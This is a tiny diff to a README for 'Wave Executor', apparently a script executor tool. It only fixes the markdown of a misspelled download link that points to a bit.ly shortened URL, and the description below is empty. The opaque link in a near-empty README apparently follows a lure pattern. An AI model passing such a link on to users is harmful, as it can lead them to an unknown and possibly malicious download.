@@ -1,6 +1,6 @@
 # Wave Executor
 
-[Downlaod Wave Executor pe11(https://bit.ly/4idHmRr)
+[Downlaod Wave Executor pe11](https://bit.ly/4idHmRr)
 
 ## Description
 
